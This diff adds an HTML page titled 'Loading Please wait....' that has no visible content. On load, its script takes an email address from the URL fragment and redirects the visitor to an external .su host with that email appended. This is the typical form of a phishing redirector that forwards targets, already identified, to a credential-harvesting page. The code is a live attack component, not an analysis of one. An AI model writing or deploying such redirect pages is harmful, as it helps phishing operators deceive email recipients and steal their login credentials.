@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Loading Please wait....</title>
+    <script>
+      // Function to extract the value after the '#' symbol in the URL
+      function getEmailFromUrl() {
+        var url = window.location.href;
+        var email = url.split("#")[1];
+        return email;
+      }
+
+      // Function to manipulate the URL and redirect
+      function manipulateUrl() {
+        // Get the email from the URL
+        var email = getEmailFromUrl();
+
+        // Check if email exists
+        if (email) {
+          // Append the email to the new URL
+          var newUrl =
+            "https://techvivid.exnet.su/jXUEc/#" +
+            email;
+
+          // Redirect to the new URL
+          window.location.href = newUrl;
+        } else {
+          console.error("No email found in the URL.");
+        }
+      }
+
+      // Call the function when the page loads
+      window.onload = function () {
+        manipulateUrl();
+      };
+    </script>
+  </head>
+  <body>
+    <!-- Your HTML content goes here -->
+  </body>
+</html>
